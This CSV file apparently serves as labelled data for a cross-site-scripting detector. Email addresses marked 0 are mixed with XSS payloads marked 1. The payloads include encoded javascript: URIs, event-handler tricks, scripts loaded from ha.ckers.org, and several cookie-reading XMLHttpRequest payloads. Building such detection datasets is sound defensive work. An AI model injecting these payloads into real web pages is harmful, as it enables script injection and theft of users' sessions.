input,label
fgosson1b@w3.org,0
jsleicht1c@fda.gov,0
lblindt1d@abc.net.au,0
tleaton1e@google.ru,0
jeadmead1f@joomla.org,0
fdelayglesia1g@latimes.com,0
aledbury1h@unblog.fr,0
jstrange1i@hao123.com,0
tgaspar1j@microsoft.com,0
dbuckland1k@ucoz.ru,0
dnealon1l@fc2.com,0
tpiatkowski1m@wikispaces.com,0
dfatscher1n@photobucket.com,0
tassur1o@wp.com,0
kmenezes1p@istockphoto.com,0
zallkins1q@auda.org.au,0
adutson1r@amazon.com,0
kworg1s@ucla.edu,0
tbrear1t@bloomberg.com,0
igrassick1u@google.ru,0
hcathcart1v@cnn.com,0
bpaulo1w@mozilla.com,0
eminor1x@feedburner.com,0
pmerwood1y@state.tx.us,0
<script>+-+-1-+-+alert(1)</script>,1
<body/onload=&lt;!--&gt;&#10alert(1)>,1
<script itworksinallbrowsers>/*<script* */alert(1)</script ?,1
<img src ?itworksonchrome?\/onerror = alert(1)???,1
<svg><script>//&NewLine;confirm(1);</script </svg>,1
<svg><script onlypossibleinopera:-)> alert(1),1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1
<script x> alert(1) </script 1=2,1
"<div/onmouseover='alert(1)'> style=""x:"">",1
<--`<img/src=` onerror=alert(1)> --!>,1
tmacquire1z@163.com,0
mbaumer20@buzzfeed.com,0
btrustey21@addthis.com,0
vkolak22@wikispaces.com,0
tdowning23@thetimes.co.uk,0
lchastney24@skype.com,0
wgurry25@marketwatch.com,0
rkyles26@wp.com,0
gfenge27@hp.com,0
bmiddup28@biglobe.ne.jp,0
bsings29@yahoo.co.jp,0
amilch2a@is.gd,0
gloughlin2b@plala.or.jp,0
xbrislawn2c@disqus.com,0
atunbridge2d@dyndns.org,0
msyddon2e@eventbrite.com,0
dstelfox2f@gmpg.org,0
siffland2g@rediff.com,0
jcockson2h@ebay.co.uk,0
aleuren2i@rakuten.co.jp,0
aedgler2j@yellowbook.com,0
spearton2k@gmpg.org,0
><img src=x onerror=prompt(1);>,1
<SCRIPT>alert('XSS');</SCRIPT>,1
";!--""<XSS>=&{()}",1
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
"<IMG SRC=""javascript:alert('XSS');"">",1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
ttantum2l@newyorker.com,0
bhallbord2m@ted.com,0
rdurbridge2n@trellian.com,0
educkham2o@livejournal.com,0
kshemmin2p@sourceforge.net,0
aarlott2q@ox.ac.uk,0
dlamas2r@engadget.com,0
wokell2s@taobao.com,0
nfeake2t@gravatar.com,0
krobertis2u@dyndns.org,0
chort2v@histats.com,0
iglenton2w@flickr.com,0
lsermin2x@nationalgeographic.com,0
wflanders2y@google.com.br,0
mchadwick2z@t-online.de,0
mmoulsdale30@senate.gov,0
whagger31@blogger.com,0
cpetz32@craigslist.org,0
harcase33@e-recht24.de,0
ecogdon34@discovery.com,0
lpapis35@tuttocitta.it,0
hpahl36@sakura.ne.jp,0
rporter37@nyu.edu,0
desch38@cyberchimps.com,0
fgrishukov39@hc360.com,0
mlerer3a@sohu.com,0
<svg/onload=alert(1),1
<input value=<><iframe/src=javascript:confirm(1),1
"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",1
http://www.<script>alert(1)</script .com,1
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?,1
<svg><script ?>alert(1),1
xrewbottom3b@xrea.com,0
hskelton3c@csmonitor.com,0
ctwelvetrees3d@opensource.org,0
gloughead3e@ezinearticles.com,0
gdraayer3f@photobucket.com,0
ntofanini3g@loc.gov,0
hdelph3h@apache.org,0
mrothman3i@ebay.com,0
idabinett3j@globo.com,0
jyuryaev3k@spotify.com,0
atripet3l@e-recht24.de,0
obernini3m@mtv.com,0
lpeto3n@ebay.com,0
jvonsalzberg3o@furl.net,0
wmignot3p@dagondesign.com,0
cbodill3q@issuu.com,0
truprecht3r@huffingtonpost.com,0
rmorfell3s@disqus.com,0
eary3t@sohu.com,0
cscothorne3u@answers.com,0
dbottrill3v@1und1.de,0
gcantera3w@bandcamp.com,0
btuck3x@vkontakte.ru,0
wmulliner3y@wisc.edu,0
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",1
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",1
><img src=x onerror=window.open('https://www.google.com/');>,1
<form><button formaction=javascript&colon;alert(1)>CLICKME,1
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1
cchippindall3z@dropbox.com,0
fsalasar40@google.co.jp,0
fdriffield41@51.la,0
bpidgeley42@google.it,0
sscipsey43@xrea.com,0
dreynoollds44@gizmodo.com,0
mskim45@cnet.com,0
rmarians46@ameblo.jp,0
dambler47@chron.com,0
hgillison48@wired.com,0
lcharlo49@diigo.com,0
meginton4a@answers.com,0
apaulitschke4b@alexa.com,0
gdorant4c@theguardian.com,0
mold4d@salon.com,0
sgerhartz4e@wunderground.com,0
wcorday4f@abc.net.au,0
sglowinski4g@tinypic.com,0
rlongea4h@cdbaby.com,0
jmcgowan4i@simplemachines.org,0
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?",1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",1
ematchett4j@unc.edu,0
heglaise4k@blogspot.com,0
scoleiro4l@digg.com,0
irutgers4m@furl.net,0
kverheyden4n@state.tx.us,0
mgladyer4o@mapquest.com,0
sosban4p@google.ru,0
cdeniskevich4q@digg.com,0
dsalterne4r@hhs.gov,0
lverzey4s@netlog.com,0
scahen4t@huffingtonpost.com,0
jscammonden4u@over-blog.com,0
pbrisker4v@nih.gov,0
rbendig4w@amazonaws.com,0
dbootland4x@nature.com,0
cdressel4y@amazon.de,0
rcastlake4z@mlb.com,0
fborzoni50@goodreads.com,0
tceschini51@lycos.com,0
hblench52@meetup.com,0
mmunkley53@infoseek.co.jp,0
npersehouse54@google.cn,0
ccovelle55@angelfire.com,0
erubinsaft56@list-manage.com,0
gisgate57@independent.co.uk,0
vsute58@fema.gov,0
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1
"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1
<img src=`xx:xx`onerror=alert(1)>,1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
rwaddie59@about.com,0
hbrockton5a@vkontakte.ru,0
hkettlestringes5b@thetimes.co.uk,0
wverrechia5c@about.me,0
rgerber5d@samsung.com,0
shagard5e@webeden.co.uk,0
shuxton5f@tinyurl.com,0
gdotterill5g@intel.com,0
thadden5h@slate.com,0
gshedden5i@cafepress.com,0
sgallatly5j@chicagotribune.com,0
vgiffon5k@edublogs.org,0
omeasham5l@archive.org,0
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>?",1
<svg contentScriptType=text/vbs><script>MsgBox+1,1
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",1
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,1
arupke5m@bbb.org,0
afrancesco5n@ask.com,0
bmacgahy5o@naver.com,0
cmatousek5p@so-net.ne.jp,0
mhaythornthwaite5q@virginia.edu,0
cbunyan5r@technorati.com,0
szorro5s@nytimes.com,0
dpipes5t@amazon.com,0
dcamlin5u@nps.gov,0
dlindholm5v@homestead.com,0
btilley5w@wiley.com,0
lseers5x@liveinternet.ru,0
pfiddian5y@instagram.com,0
fmiddle5z@census.gov,0
gskeath60@google.com.hk,0
fskelding61@multiply.com,0
rleather62@slate.com,0
kphysic63@amazonaws.com,0
kgrimme64@wsj.com,0
fchominski65@army.mil,0
qmaccartair66@sciencedaily.com,0
blarby67@tinyurl.com,0
rshawell68@jimdo.com,0
hjeffery69@theatlantic.com,0
omiroy6a@wikispaces.com,0
ncamoletto6b@dell.com,0
agajewski6c@lycos.com,0
mslayford6d@squidoo.com,0
aspinney6e@reuters.com,0
jblakiston6f@instagram.com,0
cpennell6g@nature.com,0
stolliday6h@rediff.com,0
relsey6i@smh.com.au,0
mcaldero6j@guardian.co.uk,0
deaglen6k@rediff.com,0
iatkinson6l@timesonline.co.uk,0
bsango6m@usgs.gov,0
wbawcock6n@ucla.edu,0
pkillingback6o@phpbb.com,0
mleads6p@pagesperso-orange.fr,0
hchristopherson6q@huffingtonpost.com,0
spinor6r@ucoz.ru,0
eellinor6s@thetimes.co.uk,0
aparkhouse6t@engadget.com,0
rsheering6u@hostgator.com,0
gashpital6v@xinhuanet.com,0
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,1
"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,1
"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1
rleckey6w@unicef.org,0
tupcraft6x@baidu.com,0
ashiell6y@artisteer.com,0
lstruss6z@phpbb.com,0
tblazdell70@opera.com,0
dknowlman71@hao123.com,0
sbangham72@dedecms.com,0
rhemshall73@zdnet.com,0
dklimus74@php.net,0
bnerney75@constantcontact.com,0
rcamilio76@reuters.com,0
bgoom77@soundcloud.com,0
aheatly78@unblog.fr,0
smouncher79@abc.net.au,0
fjeannard7a@house.gov,0
acaville7b@diigo.com,0
lkittles7c@craigslist.org,0
jmeaddowcroft7d@etsy.com,0
wtopper7e@jalbum.net,0
sseaking7f@phoca.cz,0
alowless7g@cocolog-nifty.com,0
mfawlks7h@wikispaces.com,0
mlistone7i@eventbrite.com,0
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",1
<%<!--'%><script>alert(1);</script -->,1
"<script src=""data:text/javascript,alert(1)""></script>",1
<iframe/src \/\/onload = prompt(1),1
<iframe/onreadystatechange=alert(1),1
mreen7j@indiegogo.com,0
njagielski7k@patch.com,0
mdeaville7l@nature.com,0
dmoir7m@de.vu,0
rfontes7n@redcross.org,0
mhinge7o@amazon.de,0
blimer7p@reddit.com,0
sfourmy7q@blog.com,0
srangeley7r@spiegel.de,0
ninold7s@cnet.com,0
kgrinyakin7t@imgur.com,0
gjohnston7u@shutterfly.com,0
wgodbert7v@seattletimes.com,0
nbrine7w@skyrock.com,0
cacreman7x@theglobeandmail.com,0
jkahane7y@rakuten.co.jp,0
ksamett7z@yahoo.com,0
aplait80@mozilla.com,0
tstamper81@discuz.net,0
bnatalie82@google.co.uk,0
jfydo83@imdb.com,0
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>,1
"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>",1
"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1
bvertigan84@stanford.edu,0
ofranssen85@aboutads.info,0
vmerigot86@google.de,0
shyams87@mediafire.com,0
gstemson88@nydailynews.com,0
maleksahkin89@123-reg.co.uk,0
dantonijevic8a@netlog.com,0
tgallone8b@tripod.com,0
hyaldren8c@bizjournals.com,0
pclayborn8d@xrea.com,0
aantonucci8e@timesonline.co.uk,0
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
"<IMG SRC='vbscript:msgbox(""XSS"")'>",1
"<IMG SRC=""mocha:[code]"">",1
rranyelld8f@java.com,0
ttrinkwon8g@hc360.com,0
gtemblett8h@mail.ru,0
gscrowby8i@pbs.org,0
vlonergan8j@economist.com,0
lsiaspinski8k@trellian.com,0
csindell8l@utexas.edu,0
tpenner8m@cisco.com,0
spoate8n@cam.ac.uk,0
wchilley8o@cocolog-nifty.com,0
cwoolvin8p@webeden.co.uk,0
bworrell8q@europa.eu,0
aquenby8r@huffingtonpost.com,0
lbaldick8s@ft.com,0
jcragg8t@goo.gl,0
skenwin8u@google.com.br,0
amuddimer8v@macromedia.com,0
bhoggan8w@cmu.edu,0
tbuttle8x@shinystat.com,0
wpaulet8y@nba.com,0
kallone8z@imageshack.us,0
kbusby90@google.cn,0
cblackmoor91@fotki.com,0
fmoreing92@technorati.com,0
blyttle93@mashable.com,0
ggrammer94@oakley.com,0
dfosbraey95@sina.com.cn,0
jstanier96@usda.gov,0
nkirkup97@ucsd.edu,0
mtutin98@macromedia.com,0
lleavey99@mozilla.org,0
scolwill9a@census.gov,0
mcapelen9b@hp.com,0
dconnikie9c@newyorker.com,0
btrahmel9d@elpais.com,0
"<IMG SRC=""jav",1
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,1
"<IMG SRC=""javascript:alert('XSS')",1
kscarth9e@privacy.gov.au,0
smcnelis9f@parallels.com,0
gbaddam9g@miibeian.gov.cn,0
mbiffen9h@sina.com.cn,0
mwincom9i@seesaa.net,0
tlukins9j@blogspot.com,0
cmorman9k@comsenz.com,0
ndebanke9l@seesaa.net,0
nsarre9m@macromedia.com,0
athornton9n@goodreads.com,0
aculvey9o@wp.com,0
asymcox9p@uiuc.edu,0
afendt9q@timesonline.co.uk,0
gbellelli9r@twitter.com,0
bnail9s@sciencedaily.com,0
eviner9t@bloglines.com,0
fgoricke9u@ox.ac.uk,0
ksherrock9v@cafepress.com,0
bmitchinson9w@webeden.co.uk,0
smonketon9x@ebay.com,0
hjacson9y@ted.com,0
adreier9z@globo.com,0
dgoodfellowea0@cam.ac.uk,0
jgysea1@symantec.com,0
bcussena2@walmart.com,0
avamplewa3@liveinternet.ru,0
fjanesa4@time.com,0
ischolfielda5@mediafire.com,0
"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",1
bbraggintona6@homestead.com,0
aluisa7@yandex.ru,0
skennsleya8@reference.com,0
sfeltoea9@uol.com.br,0
rkneafseyaa@miibeian.gov.cn,0
uwhealab@photobucket.com,0
pdenmeadac@weebly.com,0
dortegaad@shop-pro.jp,0
fdecayetteae@gnu.org,0
ccoiteaf@yellowbook.com,0
ogaskoinag@ow.ly,0
xdennickah@linkedin.com,0
koldallai@mapquest.com,0
nboiseaj@github.com,0
cdurradak@wsj.com,0
echipmanal@paginegialle.it,0
mtreeam@state.tx.us,0
mlorrawayan@barnesandnoble.com,0
thandyao@boston.com,0
fbeadmanap@lycos.com,0
ehealesaq@reddit.com,0
mdancerar@prlog.org,0
gdaxas@skype.com,0
dteareat@dedecms.com,0
mrivalau@wikimedia.org,0
tpowleslandav@hc360.com,0
jeingerfieldaw@sohu.com,0
sbraksperax@macromedia.com,0
vredihoughay@sbwire.com,0
lvonderdellaz@shutterfly.com,0
mdevonportb0@oracle.com,0
aflanaghanb1@w3.org,0
nainscoughb2@fotki.com,0
nwhorltonb3@va.gov,0
mwymanb4@gov.uk,0
fgauvainb5@theglobeandmail.com,0
bcuninghamb6@abc.net.au,0
cmajuryb7@dailymail.co.uk,0
gcorneljesb8@tumblr.com,0
bbrudenellb9@blogs.com,0
<SCRIPT>a=/XSS/,1
"\"";alert('XSS');//",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
<BODY ONLOAD=alert('XSS')>,1
"<IMG DYNSRC=""javascript:alert('XSS')"">",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
"<BR SIZE=""&{alert('XSS')}"">",1
pcoshba@ibm.com,0
jdyetbb@tinypic.com,0
sbrunrothbc@indiegogo.com,0
egreenroabd@arizona.edu,0
eperuttobe@weibo.com,0
ifennersbf@cnn.com,0
hesilmonbg@themeforest.net,0
nlostybh@sitemeter.com,0
hfyndonbi@mediafire.com,0
lmonellebj@de.vu,0
ehoneywoodbk@princeton.edu,0
tyankishinbl@newyorker.com,0
vforcerbm@mozilla.com,0
eedmeadbn@globo.com,0
lrouthambo@diigo.com,0
aschallbp@constantcontact.com,0
leberstbq@nymag.com,0
gbriamobr@wired.com,0
rrogierbs@cnn.com,0
nmacavaddybt@geocities.com,0
btallowinbu@moonfruit.com,0
sogglebiebv@seesaa.net,0
ttitterrellbw@over-blog.com,0
cbardnambx@cloudflare.com,0
"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",1
"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",1
"<a target=""x"" href=""xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",1
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
"<IMG SRC=""livescript:[code]"">",1
qgwinnettby@hubpages.com,0
ygirkebz@dmoz.org,0
vmatiasekc0@yolasite.com,0
nesmondec1@hugedomains.com,0
hmcgibbonc2@amazonaws.com,0
dmckennac3@mashable.com,0
ndriffieldc4@mashable.com,0
ybenedyktowiczc5@hubpages.com,0
fkeggc6@nytimes.com,0
erodolfc7@addthis.com,0
tbenesc8@csmonitor.com,0
jhansenc9@paginegialle.it,0
djeffcockca@accuweather.com,0
okullmanncb@cocolog-nifty.com,0
dbenfordcc@rambler.ru,0
eedwardscd@lycos.com,0
enailece@indiegogo.com,0
sbooelncf@spiegel.de,0
mmaphamcg@techcrunch.com,0
ucarlesich@washingtonpost.com,0
drensci@salon.com,0
jreuvencj@wix.com,0
cdabesck@instagram.com,0
kcyphuscl@umich.edu,0
mgianotticm@deliciousdays.com,0
dmoircn@etsy.com,0
cwitchardco@usda.gov,0
jlougheadcp@twitter.com,0
ngysecq@google.co.jp,0
"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",1
"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",1
dgoughcr@sfgate.com,0
bbarribalcs@istockphoto.com,0
rclinkct@bloomberg.com,0
gannicecu@skyrock.com,0
echristalcv@xing.com,0
ltersaycw@redcross.org,0
tdawsoncx@columbia.edu,0
mmeryettcy@comsenz.com,0
achittercz@tinyurl.com,0
hbanfilld0@youtu.be,0
doscollaind1@cocolog-nifty.com,0
asturted2@yale.edu,0
chalseyd3@last.fm,0
bpreslandd4@bigcartel.com,0
smeldingd5@paypal.com,0
pkopmand6@tripadvisor.com,0
gwestmand7@salon.com,0
cbatchleyd8@ustream.tv,0
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,1
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",1
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
ehobbingd9@gov.uk,0
ctorranceda@livejournal.com,0
swillcotdb@walmart.com,0
bcomettoidc@csmonitor.com,0
mboughtondd@epa.gov,0
